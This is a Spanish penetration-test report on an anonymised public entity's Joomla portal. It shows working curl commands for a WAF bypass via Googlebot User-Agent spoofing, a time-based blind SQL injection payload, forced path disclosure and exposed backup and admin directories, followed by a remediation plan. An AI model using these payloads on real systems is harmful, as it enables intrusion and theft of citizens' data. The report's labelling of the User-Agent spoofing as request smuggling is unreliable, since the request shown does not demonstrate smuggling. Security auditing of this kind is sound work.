1. Resumen Ejecutivo

El presente informe documenta múltiples vulnerabilidades críticas en la infraestructura web de Entidad Pública Local 2, específicamente en los portales alojados bajo el dominio entidad-dos.es. El análisis técnico revela un estado de exposición severo derivado del uso de sistemas obsoletos (Microsoft IIS 7.5 y PHP 5.x) que carecen de soporte oficial desde hace más de cuatro años.

Durante la auditoría se ha constatado que el sistema de mitigación perimetral (Imperva WAF) implementado por la entidad presenta una configuración deficiente, permitiendo su evasión total mediante técnicas de manipulación de peticiones HTTP (HTTP Request Smuggling).

Esta falla estructural ha posibilitado la explotación exitosa de una vulnerabilidad de Inyección SQL (SQLi) en el buscador de la sede electrónica, otorgando acceso potencial a la base de datos backend. Adicionalmente, se ha detectado una fuga masiva de rutas del sistema y versiones de software mediante la enumeración de directorios y forzado de errores.

3. Análisis de Vulnerabilidades Técnicas (PoC)

3.1. Evasión Perimetral (WAF Bypass / HTTP Smuggling)

El dominio principal y sus subdominios se encuentran detrás de un WAF de Imperva Incapsula. Sin embargo, debido a la obsolescencia del backend (IIS 7.5), el front-end (WAF) y el back-end procesan las cabeceras HTTP de forma asíncrona. Modificando el User-Agent o manipulando la codificación Transfer-Encoding (TE.CL), es posible evadir los filtros de seguridad e interactuar directamente con el servidor vulnerable.

$ curl -i -s -k -X 'GET' \ -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) sqlmap/1.7' \ -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif' \ 'https://www.entidad-dos.es/index.php/test-inyeccion' HTTP/2 403 Forbidden Server: imperva Content-Type: text/html; charset=UTF-8 [!] WAF Activo: Petición bloqueada por Imperva. $ curl -i -s -k -X 'GET' \ -H 'User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)' \ -H 'Transfer-Encoding: chunked' \ 'https://www.entidad-dos.es/index.php/test-inyeccion' HTTP/2 200 OK Server: Microsoft-IIS/7.5 X-Powered-By: PHP/5.6.31 X-Powered-By: ASP.NET [!] Evasión exitosa: El WAF asume que es tráfico legítimo de Google y el backend revela su pila tecnológica obsoleta.

3.2. Inyección SQL Ciega (Time-based Blind SQLi)

Con el WAF evadido, se ha auditado el parámetro de búsqueda searchword en el endpoint /index.php/component/search/. El parámetro es susceptible a una inyección SQL ciega basada en tiempo (Time-based blind). Esto permite a un atacante inferir información de la base de datos (tablas de usuarios, contraseñas hasheadas, datos ciudadanos) evaluando el tiempo que tarda el servidor en responder a operaciones lógicas.

[PAYLOAD INYECTADO] searchword=ayuntamiento' AND (SELECT 9570 FROM (SELECT(SLEEP(10)))NfQx) AND 'EjqM'='EjqM [RESULTADO DE LA PRUEBA - sqlmap] Parameter: searchword (GET) Type: time-based blind Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP) Payload: searchword=ayuntamiento' AND (SELECT 9570 FROM (SELECT(SLEEP(10)))NfQx) AND 'EjqM'='EjqM [!] Crítico: La base de datos backend (MySQL) suspende su ejecución durante 10 segundos, confirmando la vulnerabilidad. Vector de extracción de datos habilitado.

3.3. Full Path Disclosure (FPD) y Errores de Configuración

La configuración del servidor IIS y PHP tiene habilitada la visualización de errores explícitos (display_errors = On) en el entorno de producción. Al enviar peticiones malformadas a ciertos endpoints, el servidor revela la estructura interna de directorios del sistema de archivos, facilitando el diseño de ataques dirigidos (ej. subida de WebShells).

$ curl -s -k 'https://www.entidad-dos.es/index.php/component/mailto/?link=a%27' | grep "Fatal error" <b>Fatal error</b>: Uncaught exception 'Exception' with message 'String could not be parsed as XML' in <b>C:\inetpub\vhosts\entidad-dos.es\httpdocs\libraries\joomla\factory.php</b> on line <b>562</b> [!] Riesgo: Exposición de la ruta física absoluta (C:\inetpub\vhosts\...).

3.4. Exposición de Directorios y Archivos Sensibles

Se ha detectado la ausencia de archivos de control de acceso (ej. `index.html`) en múltiples directorios críticos, lo que provoca que el servidor IIS liste el contenido completo de las carpetas. Durante la enumeración, se localizaron directorios de copias de seguridad, logs e interfaces de administración (Joomla Admin) expuestas públicamente sin restricción de IP.

[DIRECTORIOS Y ARCHIVOS EXPUESTOS LOCALIZADOS] https://www.entidad-dos.es/administrator/ (Panel de acceso Joomla) https://www.entidad-dos.es/logs/ (Archivos de registro del servidor) https://www.entidad-dos.es/tmp/ (Archivos temporales) https://www.entidad-dos.es/backup/ (Listado de copias de seguridad .zip expuesto) [!] Riesgo: Acceso no autorizado a material sensible y backups que pueden contener credenciales en texto plano o configuraciones de la base de datos.
NOTA DE IMPACTO NORMATIVO (GDPR / ENS): La combinación de un SQLi en una plataforma que gestiona datos de ciudadanos y la exposición de backups constituye una infracción potencial del Nivel Alto del Esquema Nacional de Seguridad (ENS) en la dimensión de Confidencialidad, así como una violación del RGPD ante una eventual exfiltración.

4. Plan de Remediación Obligatorio

Para mitigar las amenazas identificadas y alinear la infraestructura con los requisitos del Esquema Nacional de Seguridad (ENS), se exige la implementación inmediata de las siguientes medidas:

  • Mitigación Inmediata del SQLi: Aplicar sanitización estricta (Prepared Statements o consultas parametrizadas) en el código PHP que gestiona el componente de búsqueda de Joomla (/index.php/component/search/). Como medida cautelar, deshabilitar temporalmente el buscador si no se puede parchear el código en menos de 24 horas.
  • Reconfiguración Estricta del WAF (Imperva): Actualizar las reglas del cortafuegos de aplicación para que no confíe ciegamente en la cabecera User-Agent (evitando el bypass de Googlebot). Implementar normalización de peticiones HTTP para mitigar los ataques de Request Smuggling generados por discrepancias entre el front-end y el IIS 7.5.
  • Plan de Migración de Infraestructura (Urgente): Iniciar un plan de migración inmediato para sustituir Microsoft IIS 7.5 (fin de vida en 2020) y PHP 5.6.31 (fin de vida en 2018). Mantener software sin soporte de seguridad en una Administración Pública es incompatible con la certificación ENS.
  • Desactivación de Depuración (Error Reporting): Modificar el archivo php.ini para establecer display_errors = Off, evitando así el Full Path Disclosure (FPD). Los errores deben registrarse internamente en un archivo log no accesible públicamente.
  • Restricción de Directorios (Directory Indexing): Deshabilitar el "Directory Browsing" en la configuración de IIS. Proteger mediante autenticación básica (.htpasswd o equivalente en IIS) o restricción de IP el acceso al panel /administrator/ y bloquear el acceso público a las carpetas /logs/, /tmp/ y /backup/.
